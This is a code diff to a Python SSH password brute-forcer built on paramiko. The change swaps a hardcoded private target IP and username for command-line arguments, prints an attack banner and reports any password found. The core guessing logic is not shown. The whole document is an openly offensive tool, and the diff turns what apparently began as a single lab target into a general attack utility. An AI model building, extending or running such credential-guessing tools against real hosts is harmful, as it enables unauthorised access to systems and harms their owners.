@@ -3,6 +3,7 @@ import itertools
 import paramiko
 from tqdm import tqdm
 import time
+import argparse
 
 def bruteforce_ssh(ip_addr,username):
     min_length=1
@@ -48,9 +49,15 @@ def ssh_connect(ip_addr,username,password):
     
     
 if __name__ == "__main__":
-    ip_addr = '172.16.233.149'
-    user_name = 'c2srnano13'
-    success,password=bruteforce_ssh('172.16.233.149','c2srnano13')
+    parser = argparse.ArgumentParser(description='Alphabet-based brute force (a-zA-Z0-9!@#)')
+    parser.add_argument('target_ip_addr', help='IP of target')
+    parser.add_argument('target_user_name', help='Username of target')
+    
+    args = parser.parse_args()
+    ip_addr = args.target_ip_addr
+    user_name = args.target_user_name
+    print(f"[*] Starting brute force attack on {ip_addr} with username {user_name}")
+    success,password=bruteforce_ssh(ip_addr,user_name)
     if success:
         print(f"Password found: {password}")
     else:
